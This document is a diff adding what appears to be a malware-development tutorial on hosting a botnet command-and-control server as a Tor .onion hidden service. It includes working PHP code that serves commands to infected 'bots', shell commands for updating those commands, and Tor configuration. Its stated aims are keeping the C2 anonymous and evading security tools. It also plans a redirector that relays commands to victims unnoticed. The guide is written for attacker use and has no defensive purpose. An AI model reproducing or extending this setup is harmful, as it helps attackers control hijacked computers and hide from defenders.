@@ -1,0 +1,65 @@
+COMMAND AND CONTROL SERVER
+- Botnet(Robot and network) refers the network of hijacked computer devices used
+to carry out various cyberattacks.
+Deploying a C2 on a .onion address
+
+BENEFITS AND USE IN MALWARE DEVELOPMENT
+- Tor provides strong privacy and security. The .onion address hides your servers
+real location making it hard for defenders to find it or block it.
+Useful in maldev:
+1. Keeps C2 infrastructure anonymous
+2. Avoid detection by security tool
+3. Allows secure communication between your malware and your server
+4. Works worldwide even in censored regions.
+
+1. Code Simple PHP code
+─(root㉿kali)-[/home/kali/botnet_tor]
+└─# cat server.php      
+<?php
+//get_command.php
+//c2 endpoint to serve a command file to the agent
+
+//path to the command file
+$commandFile=__DIR__."/commands/command.txt";
+
+if(!file_exists($commandFile)){
+        http_response_code(404);
+        echo "Command not found";
+        exit;
+}
+
+//send the command.txt file content
+header("Content-Type: text/plain");
+header("Content-Disposition: inline; filename=\"command.txt\"");
+readfile($commandFile);
+
+run(after making directory):
+	kali>php -S 127.0.0.1:8000
+
+2. Make a new directory where the server is at commands/command.txt
+	kali> echo "whoami" > command.txt
+-Updating the command for the bots
+	kali> echo pwd > command.txt
+
+3. The tor setup
+	kali> sudo apt install tor
+	kali> nano /etc/tor/torrc
+- Edit this lines to point to our .onion site
+	HiddenServiceDir /var/lib/tor/my_c2/
+	HiddenServicePort 80 127.0.0.1:8000                 ----> this is our php port we are forwarding
+Ctrl + S then Ctrl + x
+- Start the tor server
+	kali> sudo systemctl start tor
+- Get our .onion url
+	kali> sudo cat /var/lib/tor/my_c2/hostname
+
+4. Remember to access this we need the Tor Browser.
+
+NEXT STEPS:
+- Implants(agents) require to install tor browser to get the command.
+-----> SOL: Build an HTTP or HTTPS C2 redirector. Proxy between victim and 
+your hidden Tor C2 server.
+-----> Fetches commands from the Tor API quietly and delivers them over normal
+web traffic.
+
+NOTE: Even though the method is simple same method works for more advanced C2.
